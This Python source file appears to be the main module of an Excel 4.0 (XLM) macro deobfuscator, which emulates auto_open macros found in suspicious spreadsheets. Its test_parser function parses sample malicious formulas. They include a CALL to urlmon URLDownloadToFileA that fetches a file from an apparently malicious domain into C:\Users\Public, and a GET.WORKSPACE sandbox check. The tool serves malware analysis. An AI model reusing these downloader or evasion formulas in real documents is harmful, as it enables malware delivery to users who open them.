import argparse
import os
import sys
from lark import Lark
from lark.exceptions import ParseError
from lark.lexer import Token
from lark.tree import Tree
from XLMMacroDeobfuscator.excel_wrapper import XlApplicationInternational
from XLMMacroDeobfuscator.xlsm_wrapper import XLSMWrapper
from XLMMacroDeobfuscator.xls_wrapper import XLSWrapper
from XLMMacroDeobfuscator.xlsb_wrapper import XLSBWrapper
from enum import Enum
import time
import datetime
from XLMMacroDeobfuscator.boundsheet import *
import os
import operator
import copy


class EvalStatus(Enum):
    FullEvaluation = 1
    PartialEvaluation = 2
    Error = 3
    NotImplemented = 4
    End = 5
    Branching = 6
    FullBranching = 7


class XLMInterpreter:
    def __init__(self, xlm_wrapper):
        self.xlm_wrapper = xlm_wrapper
        self.cell_addr_regex_str = r"((?P<sheetname>[^\s]+?|'.+?')!)?\$?(?P<column>[a-zA-Z]+)\$?(?P<row>\d+)"
        self.cell_addr_regex = re.compile(self.cell_addr_regex_str)
        self.xlm_parser = self.get_parser()
        self.defined_names = self.xlm_wrapper.get_defined_names()
        self._branch_stack = []
        self._workspace_defauls = {}
        self._expr_rule_names = ['expression', 'concat_expression', 'additive_expression', 'multiplicative_expression']
        self._operators = {'+': operator.add, '-': operator.sub, '*': operator.mul, '/': operator.truediv}
        self._indent_level = 0
        self._indent_current_line = False

    @staticmethod
    def is_float(text):
        try:
            float(text)
            return True
        except ValueError:
            return False
        except TypeError:
            return False

    @staticmethod
    def is_int(text):
        try:
            int(text)
            return True
        except ValueError:
            return False
        except TypeError:
            return False

    @staticmethod
    def is_bool(text):
        try:
            bool(text)
            return True
        except ValueError:
            return False
        except TypeError:
            return False

    def get_parser(self):
        xlm_parser = None
        grammar_file_path = os.path.join(os.path.dirname(__file__), 'xlm-macro.lark.template')
        with open(grammar_file_path, 'r', encoding='utf_8') as grammar_file:
            macro_grammar = grammar_file.read()
            macro_grammar = macro_grammar.replace('{{XLLEFTBRACKET}}',
                                                  self.xlm_wrapper.get_xl_international_char(
                                                      XlApplicationInternational.xlLeftBracket))
            macro_grammar = macro_grammar.replace('{{XLRIGHTBRACKET}}',
                                                  self.xlm_wrapper.get_xl_international_char(
                                                      XlApplicationInternational.xlRightBracket))
            macro_grammar = macro_grammar.replace('{{XLLISTSEPARATOR}}',
                                                  self.xlm_wrapper.get_xl_international_char(
                                                      XlApplicationInternational.xlListSeparator))
            xlm_parser = Lark(macro_grammar, parser='lalr')

        return xlm_parser

    def get_formula_cell(self, macrosheet, col, row):
        result_cell = None
        not_found = False
        row = int(row)
        current_row = row
        current_addr = col + str(current_row)
        while current_addr not in macrosheet.cells or \
                macrosheet.cells[current_addr].formula is None:
            if (current_row - row) < 10000:
                current_row += 1
            else:
                not_found = True
                break
            current_addr = col + str(current_row)

        if not_found is False:
            result_cell = macrosheet.cells[current_addr]

        return result_cell

    def get_cell_addr(self, current_cell, cell_parse_tree):
        res_sheet = res_col = res_row = None
        if type(cell_parse_tree) is Token:
            names = self.xlm_wrapper.get_defined_names()
            label = cell_parse_tree.value.lower()
            if label in names:
                res_sheet, res_col, res_row = Cell.parse_cell_addr(names[label])
            if label.strip('"') in names:
                res_sheet, res_col, res_row = Cell.parse_cell_addr(names[label.strip('"')])
        else:
            cell = cell_parse_tree.children[0]

            if cell.data == 'a1_notation_cell':
                if len(cell.children) == 2:
                    cell_addr = "'{}'!{}".format(cell.children[0],cell.children[1])
                else:
                    cell_addr = cell.children[0]
                res_sheet, res_col, res_row = Cell.parse_cell_addr(cell_addr)
                if res_sheet is None:
                    res_sheet = current_cell.sheet.name
            elif cell.data == 'r1c1_notation_cell':
                first_child = cell.children[0]
                second_child = cell.children[1]
                res_sheet = current_cell.sheet.name
                res_col = Cell.convert_to_column_index(current_cell.column)
                res_row = int(current_cell.row)
                if first_child == 'R' and self.is_int(second_child):
                    res_row = res_row + int(second_child)
                    if len(cell.children) == 4:
                        res_col = res_col + int(cell.children[4])
                elif second_child == 'c':
                    res_col = res_col + int(cell.children[2])

                res_row = str(res_row)
                res_col = Cell.convert_to_column_name(res_col)
            else:
                raise Exception('Cell addresss, Syntax Error')

        return res_sheet, res_col, res_row

    def get_cell(self, sheet_name, col, row):
        result = None
        sheets = self.xlm_wrapper.get_macrosheets()
        if sheet_name in sheets:
            sheet = sheets[sheet_name]
            addr = col + str(row)
            if addr in sheet.cells:
                result = sheet.cells[addr]

        return result

    def set_cell(self, sheet_name, col, row, text):
        sheets = self.xlm_wrapper.get_macrosheets()
        if sheet_name in sheets:
            sheet = sheets[sheet_name]
            addr = col + str(row)
            if addr not in sheet.cells:
                new_cell = Cell()
                new_cell.column = col
                new_cell.row = row
                new_cell.sheet = sheet
                sheet.cells[addr] = new_cell

            cell = sheet.cells[addr]

            if text.startswith('='):
                cell.formula = text
            else:
                cell.value = text

    def convert_parse_tree_to_str(self, parse_tree_root):
        if type(parse_tree_root) == Token:
            return str(parse_tree_root)
        else:
            result = ''
            for child in parse_tree_root.children:
                result += self.convert_parse_tree_to_str(child)
            return result

    def get_workspace(self, number):
        result = None
        if len(self._workspace_defauls) == 0:
            script_dir = os.path.dirname(__file__)
            config_dir = os.path.join(script_dir, 'configs')
            with open(os.path.join(config_dir,'get_workspace.conf'), 'r', encoding='utf_8') as workspace_conf_file:
                for index, line in enumerate(workspace_conf_file):
                    line = line.strip()
                    if len(line) > 0:
                        self._workspace_defauls[index+1] = line

        if number in self._workspace_defauls:
            result = self._workspace_defauls[number]
        return result


    def evaluate_method(self, current_cell, parse_tree_root, interactive):
        status = EvalStatus.NotImplemented
        next_cell = None
        return_val = None
        text = None
        method_name = parse_tree_root.children[0] + '.' + \
                      parse_tree_root.children[2]

        arguments = []
        for i in  parse_tree_root.children[4].children:
            if type(i) is not Token:
                if len(i.children) > 0:
                    arguments.append(i.children[0])
        size = len(arguments)

        if method_name == 'ON.TIME':
            if len(arguments) == 2:
                _, status, return_val, text = self.evaluate_parse_tree(current_cell, arguments[0], interactive)
                next_sheet, next_col, next_row = self.get_cell_addr(current_cell, arguments[1])
                sheets = self.xlm_wrapper.get_macrosheets()
                if next_sheet in sheets:
                    next_cell = self.get_formula_cell(sheets[next_sheet], next_col, next_row)
                    text = 'ON.TIME({},{})'.format(text, str(next_cell))
                    status = EvalStatus.FullEvaluation
                    return_val = 0
                else:
                    text = 'ON.TIME({},{})'.format(text, self.convert_parse_tree_to_str(arguments[1]))
                    status = EvalStatus.Error
        elif method_name == "GET.WORKSPACE":
            status = EvalStatus.Error
            if len(arguments)== 1:
                arg_next_cell, arg_status, arg_return_val, arg_text = self.evaluate_parse_tree(current_cell,
                                                                                               arguments[0],
                                                                                               interactive)
                if arg_status == EvalStatus.FullEvaluation and self.is_int(arg_text):
                    workspace_param = self.get_workspace(int(arg_text))
                    current_cell.value = workspace_param
                    text = self.convert_parse_tree_to_str(parse_tree_root)
                    return_val = workspace_param
                    status = EvalStatus.FullEvaluation
                    next_cell = None
        elif method_name == "END.IF":
            self._indent_level -= 1
            self._indent_current_line = True
            status = EvalStatus.FullEvaluation

        if text is None:
            text = self.convert_parse_tree_to_str(parse_tree_root)
        return next_cell, status, return_val, text

    def evaluate_function(self, current_cell, parse_tree_root, interactive):
        next_cell = None
        status = EvalStatus.NotImplemented
        return_val = None
        text = None

        function_name = parse_tree_root.children[0]

        arguments = []
        for i in parse_tree_root.children[2].children:
            if type(i) is not Token:
                if len(i.children) > 0:
                    arguments.append(i.children[0])
                else:
                    arguments.append(i.children)
        size = len(arguments)

        if function_name == 'RUN':
            if size == 1:
                next_sheet, next_col, next_row = self.get_cell_addr(current_cell,
                                                                    arguments[0])
                if next_sheet is not None and next_sheet in self.xlm_wrapper.get_macrosheets():
                    next_cell = self.get_formula_cell(self.xlm_wrapper.get_macrosheets()[next_sheet],
                                                      next_col,
                                                      next_row)
                    text = 'RUN({}!{}{})'.format(next_sheet, next_col, next_row)
                    status = EvalStatus.FullEvaluation
                else:
                    status = EvalStatus.Error
                    text = self.convert_parse_tree_to_str(parse_tree_root)
                return_val = 0
            elif size == 2:
                text = 'RUN(reference, step)'
                status = EvalStatus.NotImplemented
            else:
                text = 'RUN() is incorrect'
                status = EvalStatus.Error

        elif function_name == 'CHAR':
            next_cell, status, return_val, text = self.evaluate_parse_tree(current_cell,
                                                                           arguments[0],
                                                                           interactive)
            if status == EvalStatus.FullEvaluation:
                text = chr(int(float(text)))
                cell = self.get_formula_cell(current_cell.sheet, current_cell.column, current_cell.row)
                cell.value = text
                return_val = text
        elif function_name == 'SEARCH':
            next_cell, status, return_val, text = self.evaluate_parse_tree(current_cell,
                                                                           arguments[0],
                                                                           interactive)

            # TODO: either all strings must be wrapped with double quote or without. Now it seems it's a mixed
            if return_val.startswith('"') and return_val.endswith('"'):
                return_val = return_val[1:-1]
            next_cell, status_dst, return_val_dst, text_dst = self.evaluate_parse_tree(current_cell,
                                                                           arguments[1],
                                                                           interactive)
            if return_val_dst.startswith('"') and return_val_dst.endswith('"'):
                return_val_dst = return_val_dst[1:-1]
            if status == EvalStatus.FullEvaluation and status_dst == EvalStatus.FullEvaluation:
                try:
                    return_val = return_val_dst.lower().index(return_val.lower())
                    text = str(return_val)
                except ValueError:
                    return_val = None
                    text = ''

                status = EvalStatus.FullEvaluation
        elif function_name == 'ISNUMBER':
            next_cell, status, return_val, text = self.evaluate_parse_tree(current_cell,
                                                                           arguments[0],
                                                                           interactive)
            if status == EvalStatus.FullEvaluation:
                if type(return_val) is float  or type(return_val) is int:
                    return_val = True
                else:
                    return_val = False
                text = str(return_val)

        elif function_name == 'FORMULA':
            next_cell, status, return_val, text = self.evaluate_parse_tree(current_cell, arguments[0], interactive)
            dst_sheet, dst_col, dst_row = self.get_cell_addr(current_cell, arguments[1])
            if status == EvalStatus.FullEvaluation:
                if text.startswith('"=') is False and self.is_float(text[1:-1]) is False:
                    self.set_cell(dst_sheet, dst_col, dst_row, text)
                else:
                    text = text[1:-1]
                    self.set_cell(dst_sheet, dst_col, dst_row, text)

            text = "FORMULA({},{})".format('"{}"'.format(text.replace('"', '""')),
                                           '{}!{}{}'.format(dst_sheet, dst_col, dst_row))
            return_val = 0

        elif function_name == 'CALL':
            argument_texts = []
            status = EvalStatus.FullEvaluation
            for argument in arguments:
                next_cell, tmp_status, return_val, text = self.evaluate_parse_tree(current_cell, argument,
                                                                                   interactive)
                if tmp_status != EvalStatus.FullEvaluation:
                    status = tmp_status

                if text is not None:
                    argument_texts.append(text)
                else:
                    argument_texts.append(' ')

            list_separator = self.xlm_wrapper.get_xl_international_char(XlApplicationInternational.xlListSeparator)
            text = 'CALL({})'.format(list_separator.join(argument_texts))
            return_val = 0

        elif function_name in ('HALT', 'CLOSE'):
            next_row = None
            next_col = None
            next_sheet = None
            text = self.convert_parse_tree_to_str(parse_tree_root)
            status = EvalStatus.End
            self._indent_level -= 1

        elif function_name == 'GOTO':
            next_sheet, next_col, next_row = self.get_cell_addr(current_cell, arguments[0])
            if next_sheet is not None and next_sheet in self.xlm_wrapper.get_macrosheets():
                next_cell = self.get_formula_cell(self.xlm_wrapper.get_macrosheets()[next_sheet],
                                                  next_col,
                                                  next_row)
                status = EvalStatus.FullEvaluation
            else:
                status = EvalStatus.Error
            text = self.convert_parse_tree_to_str(parse_tree_root)

        elif function_name.lower() in self.defined_names:
            cell_text = self.defined_names[function_name.lower()]
            next_sheet, next_col, next_row = self.parse_cell_address(cell_text)
            text = 'Label ' + function_name
            status = EvalStatus.FullEvaluation

        elif function_name == 'ERROR':
            text = 'ERROR'
            status = EvalStatus.FullEvaluation

        elif function_name == 'IF':
            visited = False

            for stack_frame in self._branch_stack:
                if stack_frame[0].get_local_address() == current_cell.get_local_address():
                    visited = True
            if visited is False:
                self._indent_level += 1
                if size == 3:
                    con_next_cell, con_status, con_return_val, con_text = self.evaluate_parse_tree(current_cell, arguments[0],
                                                                                           interactive)
                    if self.is_bool(con_return_val):
                        con_return_val = bool(con_return_val)

                    if con_status == EvalStatus.FullEvaluation:
                        if con_return_val:
                            if type(arguments[1]) is Tree or type(arguments[1]) is Token:
                                self._branch_stack.append(
                                    (current_cell, arguments[1], current_cell.sheet.cells, self._indent_level, '[TRUE]'))
                                status = EvalStatus.Branching
                            else:
                                status = EvalStatus.FullEvaluation
                        else:
                            if type(arguments[2]) is Tree or type(arguments[2]) is Token:
                                self._branch_stack.append(
                                    (current_cell, arguments[2], current_cell.sheet.cells, self._indent_level, '[FALSE]'))
                                status = EvalStatus.Branching
                            else:
                                status = EvalStatus.FullEvaluation
                        text = self.convert_parse_tree_to_str(parse_tree_root)
                        next_cell = None

                    else:
                        memory_state = copy.deepcopy(current_cell.sheet.cells)
                        if type(arguments[2]) is Tree or type(arguments[2]) is Token:
                            self._branch_stack.append((current_cell, arguments[2], memory_state,self._indent_level, '[FALSE]'))
                        if type(arguments[1]) is Tree or type(arguments[1]) is Token:
                            self._branch_stack.append((current_cell, arguments[1], current_cell.sheet.cells, self._indent_level, '[TRUE]'))

                        text = self.convert_parse_tree_to_str(parse_tree_root)

                        next_cell = None
                        status = EvalStatus.FullBranching
                else:
                    status = EvalStatus.FullEvaluation
                    text = self.convert_parse_tree_to_str(parse_tree_root)
            else:
                # loop detected
                text = '[[LOOP]]: '+ self.convert_parse_tree_to_str(parse_tree_root)
                status = EvalStatus.End

        elif function_name == 'NOW':
            text = datetime.datetime.now()
            status = EvalStatus.FullEvaluation

        elif function_name == 'DAY':
            first_arg = arguments[0]
            next_cell, status, return_val, text = self.evaluate_parse_tree(current_cell, first_arg, interactive)
            if status == EvalStatus.FullEvaluation:
                if type(text) is datetime.datetime:
                    text = str(text.day)
                    return_val = text
                    status = EvalStatus.FullEvaluation
                elif self.is_float(text):
                    text = 'DAY(Serial Date)'
                    status = EvalStatus.NotImplemented
        elif function_name == 'CONCATENATE':
            text = ''
            for arg in arguments:
                sheet_name, col, row = self.get_cell_addr(current_cell, arg)
                cell = self.get_cell(sheet_name,col,row)
                if cell is not None:
                    text += str(cell.value.strip('"'))
            return_val = text = '"{}"'.format(text)
            status = EvalStatus.FullEvaluation
        else:
            args_str = ''
            for argument in arguments:
                if type(argument) is Token or type(argument) is Tree:
                    next_cell, status, return_val, text = self.evaluate_parse_tree(current_cell, argument, False)
                    args_str += str(return_val) + ','
            args_str = args_str.strip(',')
            text = '{}({})'.format(function_name, args_str)
            # text = self.convert_parse_tree_to_str(parse_tree_root)
            status = EvalStatus.PartialEvaluation

        return next_cell, status, return_val, text

    def evaluate_parse_tree(self, current_cell, parse_tree_root, interactive=True):
        next_cell = None
        status = EvalStatus.NotImplemented
        text = None
        return_val = None

        if type(parse_tree_root) is Token:
            text = parse_tree_root.value
            status = EvalStatus.FullEvaluation
            return_val = text
        elif parse_tree_root.data == 'function_call':
            next_cell, status, return_val, text = self.evaluate_function(current_cell, parse_tree_root, interactive)

        elif parse_tree_root.data == 'method_call':
            next_cell, status, return_val, text = self.evaluate_method(current_cell, parse_tree_root, interactive)

        elif parse_tree_root.data == 'cell':
            sheet_name, col, row = self.get_cell_addr(current_cell, parse_tree_root)
            cell_addr = col + str(row)
            sheet = self.xlm_wrapper.get_macrosheets()[sheet_name]
            missing = True
            if cell_addr not in sheet.cells or sheet.cells[cell_addr].value is None:
                if interactive:
                    self.interactive_shell(current_cell,
                                           '{} is not populated, what should be its value?'.format(cell_addr))

            if cell_addr in sheet.cells:
                cell = sheet.cells[cell_addr]
                if cell.value is not None:
                    if self.is_float( cell.value) is False:
                        text = '"{}"'.format(cell.value.replace('"','""'))
                    else:
                        text = cell.value
                    status = EvalStatus.FullEvaluation
                    return_val = text
                    missing = False

                else:
                    text = "{}".format(cell_addr)
            else:
                text = "{}".format(cell_addr)

        elif parse_tree_root.data in self._expr_rule_names:
            text_left = None
            l_status = EvalStatus.Error
            for index, child in enumerate(parse_tree_root.children):
                if type(child) is Token and child.type in ['ADDITIVEOP', 'MULTIOP', 'CMPOP', 'CONCATOP']:

                    op_str = str(child)
                    right_arg = parse_tree_root.children[index + 1]
                    next_cell, r_status, return_val, text_right = self.evaluate_parse_tree(current_cell, right_arg,
                                                                                           interactive)

                    if l_status == EvalStatus.FullEvaluation and r_status == EvalStatus.FullEvaluation:
                        status = EvalStatus.FullEvaluation
                        if op_str == '&':
                            if text_left.startswith('"') and text_left.endswith('"'):
                                text_left = text_left[1:-1].replace('""','"')
                            if text_right.startswith('"') and text_right.endswith('"'):
                                text_right = text_right[1:-1].replace('""','"')

                            text_left = text_left + text_right
                            text_left = '"{}"'.format(text_left)
                        elif self.is_float(text_left) and self.is_float(text_right):
                            if op_str in self._operators:
                                op_res = self._operators[op_str](float(text_left), float(text_right))
                                if op_res.is_integer():
                                    text_left = str(int(op_res))
                                else:
                                    text_left = str(op_res)
                            else:
                                text_left = 'Operator ' + op_str
                                l_status = EvalStatus.NotImplemented
                        else:
                            text_left = self.convert_parse_tree_to_str(parse_tree_root)
                            l_status = EvalStatus.PartialEvaluation
                    else:
                        l_status = EvalStatus.PartialEvaluation
                        text_left = '{}{}{}'.format(text_left, op_str, text_right)
                    return_val = text_left
                else:
                    if text_left is None:
                        left_arg = parse_tree_root.children[index]
                        next_cell, l_status, return_val, text_left = self.evaluate_parse_tree(current_cell, left_arg,
                                                                                              interactive)

            return next_cell, l_status, return_val, text_left

        elif parse_tree_root.data == 'final':
            arg = parse_tree_root.children[1]
            next_cell, status, return_val, text = self.evaluate_parse_tree(current_cell, arg, interactive)
        else:
            status = EvalStatus.FullEvaluation
            for child_node in parse_tree_root.children:
                if child_node is not None:
                    next_cell, tmp_status, return_val, text = self.evaluate_parse_tree(current_cell, child_node,
                                                                                       interactive)
                    if tmp_status != EvalStatus.FullEvaluation:
                        status = tmp_status

        return next_cell, status, return_val, text

    def interactive_shell(self, current_cell, message):
        print('\nProcess Interruption:')
        print('CELL:{:10}{}'.format(current_cell.get_local_address(), current_cell.formula))
        print(message)
        print('Enter XLM macro:')
        print('Tip: CLOSE() or HALT() to exist')

        while True:
            line = input()
            line = '=' + line.strip()
            if line:
                try:
                    parse_tree = self.xlm_parser.parse(line)
                    next_cell, status, return_val, text = self.evaluate_parse_tree(current_cell, parse_tree,
                                                                                   interactive=False)
                    print(return_val)
                    if status == EvalStatus.End:
                        break
                except ParseError as exp:
                    print("Invalid XLM macro")
            else:
                break

    def deobfuscate_macro(self, interactive):
        result = []

        auto_open_labels = self.xlm_wrapper.get_defined_name('auto_open', full_match=False)
        if auto_open_labels is not None and len(auto_open_labels) > 0:
            macros = self.xlm_wrapper.get_macrosheets()
            print('[Starting Deobfuscation]')
            for auto_open_label in auto_open_labels:
                try:
                    sheet_name, col, row = Cell.parse_cell_addr(auto_open_label[1])
                    if sheet_name in macros:
                        current_cell = self.get_formula_cell(macros[sheet_name], col, row)
                        self._branch_stack = [(current_cell, current_cell.formula, macros[sheet_name].cells, 0, '')]
                        while len(self._branch_stack) > 0:
                            current_cell, formula, saved_cells, indent_level, desc = self._branch_stack.pop()
                            macros[current_cell.sheet.name].cells = saved_cells
                            self._indent_level = indent_level
                            stack_record = True
                            while current_cell is not None:
                                if type(formula) is str:
                                    parse_tree = self.xlm_parser.parse(formula)
                                else:
                                    parse_tree = formula
                                if stack_record:
                                    previous_indent = self._indent_level - 1
                                else:
                                    previous_indent = self._indent_level
                                next_cell, status, return_val, text = self.evaluate_parse_tree(current_cell, parse_tree,
                                                                                               interactive)
                                if return_val is not None:
                                    current_cell.value = str(return_val)
                                if next_cell is None and \
                                    (status == EvalStatus.FullEvaluation or \
                                    status == EvalStatus.PartialEvaluation or
                                    status == EvalStatus.NotImplemented):

                                    next_cell = self.get_formula_cell(current_cell.sheet,
                                                                      current_cell.column,
                                                                      str(int(current_cell.row) + 1))
                                if stack_record:
                                    text = (desc+' '+text).strip()

                                if self._indent_current_line:
                                    previous_indent = self._indent_level
                                    self._indent_current_line = False

                                yield (current_cell, status, text, previous_indent)

                                if next_cell is not None:
                                    current_cell = next_cell
                                else:
                                    break
                                formula = current_cell.formula
                                stack_record = False
                except Exception as exp:
                    print('Error: ' + str(exp))


def test_parser():
    grammar_file_path = os.path.join(os.path.dirname(__file__), 'xlm-macro-en.lark')
    macro_grammar = open(grammar_file_path, 'r', encoding='utf_8').read()
    xlm_parser = Lark(macro_grammar, parser='lalr')

    print("\n=HALT()")
    print(xlm_parser.parse("=HALT()"))
    print("\n=171*GET.CELL(19,A81)")
    print(xlm_parser.parse("=171*GET.CELL(19,A81)"))
    print("\n=FORMULA($ET$1796&$BE$1701&$DB$1527&$BU$714&$CT$1605)")
    print(xlm_parser.parse("=FORMULA($ET$1796&$BE$1701&$DB$1527&$BU$714&$CT$1605)"))
    print("\n=RUN($DC$240)")
    print(xlm_parser.parse("=RUN($DC$240)"))
    print("\n=CHAR($IE$1109-308)")
    print(xlm_parser.parse("=CHAR($IE$1109-308)"))
    print("\n=CALL($C$649,$FN$698,$AM$821,0,$BB$54,$BK$36,0,0)")
    print(xlm_parser.parse("=CALL($C$649,$FN$698,$AM$821,0,$BB$54,$BK$36,0,0)"))
    print("\n=HALT()")
    print(xlm_parser.parse("=HALT()"))
    print('\n=WAIT(NOW()+"00:00:03")')
    print(xlm_parser.parse('=WAIT(NOW()+"00:00:03")'))
    print("\n=IF(GET.WORKSPACE(19),,CLOSE(TRUE))")
    print(xlm_parser.parse("=IF(GET.WORKSPACE(19),,CLOSE(TRUE))"))
    print(r'\n=OPEN(GET.WORKSPACE(48)&"\WZTEMPLT.XLA")')
    print(xlm_parser.parse(r'=OPEN(GET.WORKSPACE(48)&"\WZTEMPLT.XLA")'))
    print(
        """\n=IF(R[-1]C<0,CALL("urlmon","URLDownloadToFileA","JJCCJJ",0,"https://ddfspwxrb.club/fb2g424g","c:\\Users\\Public\\bwep5ef.html",0,0),)""")
    print(xlm_parser.parse(
        """=IF(R[-1]C<0,CALL("urlmon","URLDownloadToFileA","JJCCJJ",0,"https://ddfspwxrb.club/fb2g424g","c:\\Users\\Public\\bwep5ef.html",0,0),)"""))


_thismodule_dir = os.path.normpath(os.path.abspath(os.path.dirname(__file__)))
_parent_dir = os.path.normpath(os.path.join(_thismodule_dir, '..'))
if _parent_dir not in sys.path:
    sys.path.insert(0, _parent_dir)

def main():

    def get_file_type(path):
        file_type = None
        with open(path, 'rb') as input_file:
            start_marker = input_file.read(2)
            if start_marker == b'\xD0\xCF':
                file_type = 'xls'
            elif start_marker == b'\x50\x4B':
                file_type = 'xlsm/b'
        if file_type == 'xlsm/b':
            raw_bytes = open(path, 'rb').read()
            if bytes('workbook.bin', 'ascii') in raw_bytes:
                file_type = 'xlsb'
            else:
                file_type = 'xlsm'
        return file_type


    def show_cells(excel_doc):
        macrosheets = excel_doc.get_macrosheets()

        auto_open_labels = excel_doc.get_defined_name('auto_open', full_match=False)
        for label in auto_open_labels:
            print('auto_open: {}->{}'.format(label[0], label[1]))

        for macrosheet_name in macrosheets:
            print('SHEET: {}, {}'.format(macrosheets[macrosheet_name].name,
                                         macrosheets[macrosheet_name].type))
            for formula_loc, info in macrosheets[macrosheet_name].cells.items():
                if info.formula is not None:
                    print('CELL:{:10}, {:20}, {}'.format(formula_loc, info.formula, info.value))

            for formula_loc, info in macrosheets[macrosheet_name].cells.items():
                if info.formula is None:
                    print('CELL:{:10}, {:20}, {}'.format(formula_loc, str(info.formula), info.value))


    arg_parser = argparse.ArgumentParser()
    arg_parser.add_argument("-f", "--file", type=str, help="The path of a XLSM file")
    arg_parser.add_argument("-n", "--noninteractive", default=False, action='store_true',
                            help="Disable interactive shell")
    arg_parser.add_argument("-x", "--extract-only", default=False, action='store_true',
                            help="Only extract cells without any emulation")

    arg_parser.add_argument("-s", "--start-with-shell", default=False, action='store_true',
                            help="Open an XLM shell before interpreting the macros in the input")

    args = arg_parser.parse_known_args()
    if args[0].file is not None:
        if os.path.exists(args[0].file):
            file_path = os.path.abspath(args[0].file)
            file_type = get_file_type(file_path)
            if file_type is not None:
                try:
                    start = time.time()
                    excel_doc = None
                    print('[Loading Cells]')
                    if file_type == 'xls':
                        excel_doc = XLSWrapper(file_path)
                    elif file_type == 'xlsm':
                        excel_doc = XLSMWrapper(file_path)
                    elif file_type == 'xlsb':
                        excel_doc = XLSBWrapper(file_path)

                    if excel_doc is None:
                        print("File format is not supported")
                    else:
                        if not args[0].extract_only:
                            interpreter = XLMInterpreter(excel_doc)
                            if args[0].start_with_shell:
                                starting_points = interpreter.xlm_wrapper.get_defined_name('auto_open',
                                                                                           full_match=False)
                                if len(starting_points) > 0:
                                    sheet_name, col, row = Cell.parse_cell_addr(starting_points[0][1])
                                    macros = interpreter.xlm_wrapper.get_macrosheets()
                                    if sheet_name in macros:
                                        current_cell = interpreter.get_formula_cell(macros[sheet_name], col, row)
                                        interpreter.interactive_shell(current_cell, "")
                            for step in interpreter.deobfuscate_macro(not args[0].noninteractive):
                                print(
                                    'CELL:{:10}, {:20},{}{}'.format(step[0].get_local_address(), step[1].name, ''.join( ['\t']*step[3]), step[2]))
                        else:
                            show_cells(excel_doc)

                        end = time.time()
                        print('time elapsed: ' + str(end - start))
                finally:
                    if type(excel_doc) is XLSWrapper:
                        excel_doc._excel.Application.DisplayAlerts = False
                        excel_doc._excel.Application.Quit()
            else:
                print('ERROR: input file type is not supported')
        else:
            print('Error: input file does not exist')
    else:
        arg_parser.print_help()


if __name__ == '__main__':
    main()

